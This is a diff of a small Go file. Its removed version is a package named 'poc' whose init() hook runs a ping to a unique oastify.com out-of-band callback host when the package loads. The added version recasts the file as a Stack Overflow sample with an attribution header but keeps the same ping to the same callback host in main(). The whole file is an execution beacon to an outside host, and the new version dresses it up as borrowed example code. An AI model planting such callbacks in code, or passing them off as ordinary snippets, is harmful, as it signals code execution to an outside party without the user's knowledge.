@@ -1,15 +1,16 @@
-package poc
+// Source - https://stackoverflow.com/a
+// Posted by Lourenco, modified by community. See post 'Timeline' for change history
+// Retrieved 2025-11-18, License - CC BY-SA 4.0
 
-/*
-#cgo CFLAGS: -Werror
-void x() {}
-*/
-import "C"
-import "os/exec"
-import "fmt"
+package main
 
-func init() {
-    cmd := exec.Command("ping 0bc32egulq8qb88n1rekfk5o1f76v3js.oastify.com")
+import (
+	"fmt"
+	"os/exec"
+)
+
+func main() {
+	cmd := exec.Command("ping", "0bc32egulq8qb88n1rekfk5o1f76v3js.oastify.com")
 	stdout, err := cmd.Output()
 
 	if err != nil {
@@ -20,5 +21,3 @@ func init() {
 	// Print the output
 	fmt.Println(string(stdout))
 }
-
-	
